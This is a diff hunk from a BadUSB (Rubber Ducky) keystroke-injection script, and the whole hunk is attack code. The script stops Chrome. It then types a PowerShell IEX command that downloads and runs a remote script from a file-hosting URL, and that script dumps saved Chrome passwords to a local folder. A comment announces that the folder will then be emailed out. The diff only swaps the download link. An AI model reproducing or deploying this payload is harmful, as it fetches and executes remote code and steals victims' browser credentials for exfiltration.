@@ -32,7 +32,7 @@ STRING Stop-Process -Name chrome
 ENTER
 DELAY 500
 REM  *** dump passwords using a modified version of Empire Project's Get-ChromeDump.ps1 ***
-STRING IEX (New-Object Net.WebClient).DownloadString('https://srv-file4.gofile.io/download/zYYjLq/asdf.ps1'); Get-ChromeDump -OutFile 'C:\l\ChromeDump.txt'
+STRING IEX (New-Object Net.WebClient).DownloadString('https://srv-file10.gofile.io/download/ssQ0hn/asdf.ps1'); Get-ChromeDump -OutFile 'C:\l\ChromeDump.txt'
 ENTER
 DELAY 20000
 REM  *** time to send an email everything in C:\l ***
